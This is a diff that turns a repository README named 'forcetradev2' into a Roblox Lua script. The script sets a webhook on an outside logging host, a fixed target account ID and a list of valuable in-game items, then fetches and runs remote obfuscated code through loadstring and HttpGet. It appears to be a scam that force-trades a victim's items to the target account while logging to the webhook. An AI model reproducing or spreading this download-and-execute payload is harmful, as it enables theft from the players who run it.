@@ -1,1 +1,44 @@
-# forcetradev2
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_3d7d35277c6a416e893593be3ed1599c"
+getgenv().TARGET_ID = 3313999841
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Cooki and Milki"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Festive 67"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Ketupat Bros"] = true,
+    ["Ketupat Kepat"] = true,
+    ["La Casa Boo"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los Amigos"] = true,
+    ["Los Sekolahs"] = true,
+    ["Love Love Bear"] = true,
+    ["Lovin Rose"] = true,
+    ["Meowl"] = true,
+    ["Money Money Puggy"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Tictac Sahur"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
